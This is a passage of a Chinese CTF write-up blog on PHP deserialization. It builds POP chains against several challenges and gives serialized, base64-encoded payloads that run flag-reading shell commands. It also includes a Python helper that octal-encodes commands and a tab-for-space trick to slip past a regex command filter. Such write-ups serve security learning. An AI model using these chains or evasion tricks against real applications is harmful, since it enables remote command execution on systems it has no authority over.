class=\"line\"><span class=\"variable\">$array</span> = [<span class=\"string\">&#x27;lastname&#x27;</span>, <span class=\"string\">&#x27;email&#x27;</span>, <span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">var_dump</span>(<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&quot;,&quot;</span>, <span class=\"variable\">$array</span>)); </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// string(20) &quot;lastname,email,phone&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>便可以将这两个函数搭配使用 构造<strong>动态函数执行语句</strong>，如下是目标语句</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509153219662.png\" alt=\"image-20240509153219662\"></p>\n<p>将目标语句放入pop中构造即可</p>\n<p><strong>pop及最终payload</strong></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">AAA</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">BBB</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>=<span class=\"string\">&#x27;cat /flag&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$d</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CCC</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$c</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$c</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">CCC</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">AAA</span>();</span><br><span class=\"line\"><span class=\"variable\">$b</span>=<span class=\"keyword\">new</span> BBB;</span><br><span class=\"line\"><span class=\"variable\">$a</span>-&gt;s=<span class=\"variable\">$b</span>;</span><br><span class=\"line\"><span class=\"variable\">$c</span>-&gt;c=<span class=\"variable\">$a</span>;</span><br><span class=\"line\"><span class=\"variable\">$d</span>=<span class=\"keyword\">array</span>(<span class=\"variable\">$c</span>,<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$d</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20240509154142589.png\" alt=\"image-20240509154142589\"></p>\n<h2 id=\"私有属性进行序列化\"><a href=\"#私有属性进行序列化\" class=\"headerlink\" title=\"私有属性进行序列化\"></a>私有属性进行序列化</h2><h3 id=\"Really-EZ-POP\"><a href=\"#Really-EZ-POP\" class=\"headerlink\" title=\"Really EZ POP\"></a>Really EZ POP</h3><p>pop链很好构造</p>\n<p>exp</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sink</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$cmd</span> = <span class=\"string\">&#x27;system(&quot;ls&quot;);&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shark</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$word</span></span>) //1 $<span class=\"title\">Si</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;word = <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Sea</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$animal</span>; <span class=\"comment\">//2 $Sh</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Nature</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$sea</span>;  <span class=\"comment\">//3 $Se</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$Si</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sink</span>;</span><br><span class=\"line\"><span class=\"variable\">$Sh</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Shark</span>;</span><br><span class=\"line\"><span class=\"variable\">$Se</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Sea</span>;</span><br><span class=\"line\"><span class=\"variable\">$N</span>=<span class=\"keyword\">new</span> <span class=\"title class_\">Nature</span>;</span><br><span class=\"line\"><span class=\"variable\">$Sh</span> -&gt;<span class=\"title function_ invoke__\">setWord</span>(<span class=\"variable\">$Si</span>);</span><br><span class=\"line\"><span class=\"variable\">$Se</span> -&gt;animal=<span class=\"variable\">$Sh</span>;</span><br><span class=\"line\"><span class=\"variable\">$N</span> -&gt;sea=<span class=\"variable\">$Se</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$N</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"php类中的私有属性\"><a href=\"#php类中的私有属性\" class=\"headerlink\" title=\"php类中的私有属性\"></a>php类中的私有属性</h3><p>考点，是低版本的php类中的<strong>私有属性</strong>进行序列化的方法</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Shark</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setWord</span>(<span class=\"params\"><span class=\"variable\">$word</span></span>) //1 $<span class=\"title\">Si</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;word = <span class=\"variable\">$word</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在Shark中的私有属性word直接使用<code>$Sh -&gt;word=$Si;</code>会报错，需要自己构造一个方法，在这里是<strong>setword</strong>,构造链子时改为<code>$Sh -&gt;setWord($Si);</code>即可，其他方法不变</p>\n<h2 id=\"序列化和rce\"><a href=\"#序列化和rce\" class=\"headerlink\" title=\"序列化和rce\"></a>序列化和rce</h2><h3 id=\"第四届极客少年挑战赛初赛-ezunserilize\"><a href=\"#第四届极客少年挑战赛初赛-ezunserilize\" class=\"headerlink\" title=\"第四届极客少年挑战赛初赛 ezunserilize\"></a>第四届极客少年挑战赛初赛 ezunserilize</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">show_source</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"comment\">//you should find flag in you self</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">new</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;i am new baby&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a-&gt;<span class=\"keyword\">new</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>,<span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func-&gt;arg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$kkk</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;look!you are hero&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;kkk;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eval</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$this</span>-&gt;s)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(<span class=\"string\">&quot;oh nonono hacker!&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">eval</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;aaaa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))); </span><br></pre></td></tr></table></figure>\n\n<p>构造poc</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>; <span class=\"comment\">//3 $tw</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>; <span class=\"comment\">// 2 $th</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>; <span class=\"comment\">//1 $fo</span></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>=<span class=\"string\">&#x27;$&quot;\\154\\163&quot;&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$o</span> =<span class=\"keyword\">new</span> one;</span><br><span class=\"line\"><span class=\"variable\">$tw</span> =<span class=\"keyword\">new</span> two;</span><br><span class=\"line\"><span class=\"variable\">$th</span>=<span class=\"keyword\">new</span> three;</span><br><span class=\"line\"><span class=\"variable\">$fo</span> = <span class=\"keyword\">new</span> four;</span><br><span class=\"line\"><span class=\"variable\">$th</span>-&gt;kkk=<span class=\"variable\">$fo</span>;</span><br><span class=\"line\"><span class=\"variable\">$tw</span>-&gt; func=<span class=\"variable\">$th</span>;</span><br><span class=\"line\"><span class=\"variable\">$o</span>-&gt;a=<span class=\"variable\">$tw</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$o</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解法一：构造八进制命令\"><a href=\"#解法一：构造八进制命令\" class=\"headerlink\" title=\"解法一：构造八进制命令\"></a>解法一：构造八进制命令</h3><p>首先想到的是构造八进制命令</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_oct</span>(<span class=\"params\">c</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将字符转换为八进制表示&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">format</span>(<span class=\"built_in\">ord</span>(c), <span class=\"string\">&#x27;03o&#x27;</span>)  <span class=\"comment\"># 使用03o格式，确保每个字符的八进制表示为三位数</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd_to_oct</span>(<span class=\"params\">cmd</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将命令字符串转换为八进制转义格式&quot;&quot;&quot;</span></span><br><span class=\"line\">    payload = <span class=\"string\">&quot;$&#x27;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> c == <span class=\"string\">&#x27; &#x27;</span>:</span><br><span class=\"line\">            payload += <span class=\"string\">&quot;&#x27; $&#x27; &quot;</span>  <span class=\"comment\"># 在空格处插入转义表示</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            payload += <span class=\"string\">&quot;\\\\&quot;</span> + get_oct(c)  <span class=\"comment\"># 添加字符的八进制转义表示</span></span><br><span class=\"line\">    payload += <span class=\"string\">&quot;&#x27;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> payload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 示例用法</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    command = <span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入要转换的命令: &quot;</span>)  <span class=\"comment\"># 从用户输入获取命令</span></span><br><span class=\"line\">    oct_payload = cmd_to_oct(command)  <span class=\"comment\"># 转换命令</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;转换后的八进制表示:&quot;</span>, oct_payload)  <span class=\"comment\"># 输出转换结果</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"空格替换-t\"><a href=\"#空格替换-t\" class=\"headerlink\" title=\"空格替换\\t\"></a>空格替换\\t</h3><p>但是<strong>ls &#x2F;存在空格</strong>直接拿burp抓包<strong>对其16进制修改</strong></p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241021191309578.png\" alt=\"image-20241021191309578\"></p>\n<p><strong>将20改为09</strong></p>\n<p>复制payload,进行base64加密</p>\n<h5 id=\"ls\"><a href=\"#ls\" class=\"headerlink\" title=\"ls\t&#x2F;\"></a>ls\t&#x2F;</h5><p><code>O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:19:&quot;$&#39;\\154\\163&#39;\t$&#39;\\057&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;</code></p>\n<p>TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjE5OiIkJ1wxNTRcMTYzJwkkJ1wwNTcnIjt9fXM6MzoiYXJnIjtOO319</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241021191638803.png\" alt=\"image-20241021191638803\"></p>\n<h5 id=\"cat-4l2g\"><a href=\"#cat-4l2g\" class=\"headerlink\" title=\"cat\t&#x2F;4l2g\"></a><strong>cat\t&#x2F;4l2g</strong></h5><p><code>O:3:&quot;one&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;two&quot;:2:&#123;s:4:&quot;func&quot;;O:5:&quot;three&quot;:1:&#123;s:3:&quot;kkk&quot;;O:4:&quot;four&quot;:1:&#123;s:1:&quot;s&quot;;s:39:&quot;$&#39;\\143\\141\\164&#39;\t$&#39;\\057\\064\\154\\062\\147&#39;&quot;;&#125;&#125;s:3:&quot;arg&quot;;N;&#125;&#125;</code></p>\n<p>TzozOiJvbmUiOjE6e3M6MToiYSI7TzozOiJ0d28iOjI6e3M6NDoiZnVuYyI7Tzo1OiJ0aHJlZSI6MTp7czozOiJra2siO086NDoiZm91ciI6MTp7czoxOiJzIjtzOjM5OiIkJ1wxNDNcMTQxXDE2NCcJJCdcMDU3XDA2NFwxNTRcMDYyXDE0NyciO319czozOiJhcmciO047fX0&#x3D;</p>\n<p><img src=\"/post/%E8%B5%9B%E9%A2%98%E6%80%BB%E7%BB%931/image-20241021191944615.png\" alt=\"image-20241021191944615\"></p>\n<blockquote>\n<p>解释为什么不用${IFS}</p>\n<ol>\n<li>牵扯到base64编码</li>\n<li>一些linux并不能识别${IFS}</li>\n</ol>\n</blockquote>\n<h3 id=\"解法二：more绕过\"><a href=\"#解法二：more绕过\" class=\"headerlink\" title=\"解法二：more绕过\"></a>解法二：more绕过</h3><p>直接payload</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//you should find flag in you self</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">new</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;i am new baby&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a-&gt;<span class=\"keyword\">new</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>,<span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func-&gt;arg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span 